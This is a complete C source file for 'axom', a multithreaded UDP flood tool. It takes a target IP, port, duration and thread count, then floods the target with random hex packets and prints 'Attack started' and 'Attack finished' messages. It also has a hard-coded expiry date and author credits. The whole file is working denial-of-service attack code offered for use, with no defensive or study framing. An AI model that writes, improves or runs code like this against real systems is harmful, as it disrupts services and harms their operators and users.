#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <openssl/rand.h>

#define MAX_THREADS 1000 // Maximum number of threads
#define DEFAULT_THREADS 100 // Default number of threads

void usage() {
    printf("Usage: ./axom <ip> <port> <duration> [threads]\n");
    printf("  <ip>: Target IP address\n");
    printf("  <port>: Target port\n");
    printf("  <duration>: Attack duration in seconds\n");
    printf("  [threads]: Number of threads (default: %d)\n", DEFAULT_THREADS);
    printf("Developed by: Ankur\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    time_t end_time;
};

// Function to generate a random hexadecimal payload
char *generate_random_hex_payload(size_t length) {
    unsigned char *random_bytes = malloc(length);
    if (!random_bytes) {
        perror("Failed to allocate memory for random bytes");
        return NULL;
    }

    // Generate random bytes
    if (RAND_bytes(random_bytes, length) != 1) {
        perror("Failed to generate random bytes");
        free(random_bytes);
        return NULL;
    }

    // Convert bytes to hexadecimal string
    char *hex_payload = malloc(2 * length + 1);
    if (!hex_payload) {
        perror("Failed to allocate memory for hex payload");
        free(random_bytes);
        return NULL;
    }

    for (size_t i = 0; i < length; i++) {
        sprintf(hex_payload + 2 * i, "%02X", random_bytes[i]);
    }
    hex_payload[2 * length] = '\0'; // Null-terminate the string

    free(random_bytes);
    return hex_payload;
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Generate a random payload for this thread
    char *payload = generate_random_hex_payload(64);
    if (!payload) {
        perror("Failed to generate payload");
        close(sock);
        pthread_exit(NULL);
    }

    while (time(NULL) < data->end_time) {  // Run until duration expires
        // Send the payload
        if (sendto(sock, payload, strlen(payload), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    free(payload); // Free the dynamically allocated payload
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 5) {
        usage();
    }

    struct tm expiry_date = {0};
    expiry_date.tm_year = 2025 - 1900;
    expiry_date.tm_mon = 05 - 1;
    expiry_date.tm_mday = 8;

    time_t now = time(NULL);
    if (difftime(now, mktime(&expiry_date)) > 0) {
        printf("This script has expired and will no longer run.\n");
        printf("Developed by: Ankur\n");
        exit(0);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);  // Duration in seconds
    int num_threads = DEFAULT_THREADS; // Default number of threads

    // Override default threads if specified
    if (argc == 5) {
        num_threads = atoi(argv[4]);
        if (num_threads <= 0 || num_threads > MAX_THREADS) {
            printf("Invalid number of threads. Must be between 1 and %d\n", MAX_THREADS);
            exit(1);
        }
    }

    time_t end_time = now + duration;

    pthread_t threads[MAX_THREADS];
    struct thread_data data = {strdup(ip), port, end_time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, num_threads);

    // Create threads
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished after %d seconds\n", duration);
    printf("Executed by: Ankur\n");

    free(data.ip);
    return 0;
}
